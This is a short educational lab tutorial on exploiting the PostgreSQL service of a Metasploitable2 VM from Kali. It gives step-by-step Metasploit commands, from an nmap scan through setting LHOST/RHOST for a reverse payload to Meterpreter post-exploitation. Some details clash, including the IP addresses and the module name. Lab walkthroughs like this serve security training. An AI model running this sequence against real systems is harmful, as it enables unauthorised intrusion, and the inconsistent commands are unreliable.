# EXPLOITING-POSTGRESQL-WITH-METASPLOIT

This documentation provides a step-by-step guide on how to use Metasploit to exploit the PostgreSQL vulnerability in a target system for educational purposes.



Prerequisites

Before proceeding, ensure that you have the following prerequisites:

•	A Kali Linux VM to act as an attacker

•	Metasploitable2 VM to act as the target



Usage

Find IP addresses

•	In the terminal type ifconfig to find IP addresses for both machines
>ifconfig

Check Connectivity

•	Ping the target machine from the attacker to verify connectivity
>ping 192.198.8.134

Nmap scan to confirm vulnerability

Perform an Nmap scan on the target machine to confirm the presence of PostgreSQL service and its vulnerability
>nmap 192.168.8.138

Search for the PostgreSQL Module	

In your terminal open Metasploit by typing msfconsole then search for the module:

msf6 > search PostgreSQL

Choose the Module

Select the exploit module for PosrgreSQL

msf6 > use exploit/linux/postgresql/postgresql_payload



Show Options

Display available options for the selected module

msf6 exploit(linux/postgresql/postgresql_payload) > show options

Set Target Host and Local Host


Configure the target host and the local host

msf6 exploit(linux/postgresql/postgresql_payload) > set LHOST 192.168.8.123

msf6 exploit(linux/postgresql/postgresql_payload) > set RHOST 192.168.8.138



Exploit the Vulnerability

Run the exploit to attack the postgreSQL service

msf6 exploit(linux/postgresql/postgres_payload) > exploit

Post-Exploitation with Meterpreter 

After successfully exploiting the target system using Metasploit's Meterpreter, gather system information to better understand the compromised host. The following commands will help you accomplish this:

1. Retrieve System Information:
Use the `sysinfo` command to get key details about the target system, such as the operating system, computer name, and architecture.

meterpreter > sysinfo

2. List Directory Contents:
Use the `dir` command to display the contents of the current directory on the target system, allowing you to explore files and directories.

meterpreter > dir
